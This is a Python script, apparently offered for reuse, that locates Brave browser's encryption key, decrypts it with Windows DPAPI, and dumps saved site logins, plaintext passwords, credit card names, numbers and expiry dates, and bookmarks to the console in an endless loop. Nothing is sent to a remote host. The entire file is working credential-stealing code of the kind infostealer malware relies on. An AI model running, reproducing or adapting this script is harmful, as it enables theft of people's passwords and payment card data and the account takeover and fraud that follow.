'''
    This Python script is used to not only fetch browser saved passwords, but also Decrypt these Passwords. 

    This Script can also fetch Stored Credit Card Data, Bookmarks
    You are free to modify this Script for your own use
    
      
'''

import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
from datetime import datetime



FileName = 116444736000000000
NanoSeconds = 10000000


def ConvertDate(ft):
    utc = datetime.utcfromtimestamp(((10 * int(ft)) - FileName) / NanoSeconds)
    return utc.strftime('%Y-%m-%d %H:%M:%S')


def get_master_key():
    '''
        This Function is used to get the Master Key, for Decrypting the Encrypted Passwords 
    '''
    try:
     with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\BraveSoftware\Brave-Browser\User Data\Local State',
              "r", encoding='utf-8') as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    except:
        exit()
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]  
    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key


def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)


def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)


def decrypt_password(buff, master_key):
    '''
        Here we are passing the buffer and Master Key to Decrypt the Password
         
    
    '''
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()  
        return decrypted_pass
    except Exception as e:
        return "Chrome < 80"


def get_password():
    master_key = get_master_key()
    login_db = os.environ[
                   'USERPROFILE'] + os.sep + r'AppData\Local\BraveSoftware\Brave-Browser\User Data\default\Login Data'
    try:
        shutil.copy2(login_db,
                     "Loginvault.db")  
    except:
        print("[*] Brave Browser Not Installed !!")
    conn = sqlite3.connect("Loginvault.db")
    cursor = conn.cursor()

    try:
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        for r in cursor.fetchall():
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            decrypted_password = decrypt_password(encrypted_password, master_key)
            if username != "" or decrypted_password != "":
                print(
                    "URL: " + url + "\nUser Name: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 10 + "\n")
    except Exception as e:
        pass

    cursor.close()
    conn.close()
    try:
        os.remove("Loginvault.db")
    except Exception as e:
        pass


def get_credit_cards():
    master_key = get_master_key()
    login_db = os.environ[
                   'USERPROFILE'] + os.sep + r'AppData\Local\BraveSoftware\Brave-Browser\User Data\default\Web Data'
    try:
        shutil.copy2(login_db,
                     "CCvault.db")  
                    
    except:
        print("[*] Brave Browser Not Installed !!")
    conn = sqlite3.connect("CCvault.db")
    cursor = conn.cursor()

    try:
        cursor.execute("SELECT * FROM credit_cards")
        for r in cursor.fetchall():
            username = r[1]
            encrypted_password = r[4]
            decrypted_password = decrypt_password(encrypted_password, master_key)
            expire_mon = r[2]
            expire_year = r[3]
            print(
                "Name in Card: " + username + "\nNumber: " + decrypted_password + "\nExpire Month: " + str(
                    expire_mon) + "\nExpire Year: " + str(expire_year) + "\n" + "*" * 10 + "\n")

    except Exception as e:
        pass

    cursor.close()
    conn.close()
    try:
        os.remove("CCvault.db")
    except Exception as e:
        pass


def get_bookmarks():
    bookmarks_location = os.environ[
                             'USERPROFILE'] + os.sep + r'AppData\Local\BraveSoftware\Brave-Browser\User Data\default\Bookmarks'
    with open(bookmarks_location) as f:
        data = json.load(f)
        bookmarks_list = data["roots"]["bookmark_bar"]["children"]
        
        for i in range(len(bookmarks_list)):
            print(f"Name: {bookmarks_list[i]['name']}\n"
            f"Added on: {ConvertDate(bookmarks_list[i]['date_added'])}\n")


while True:

        get_password()
        get_credit_cards()
        get_bookmarks()

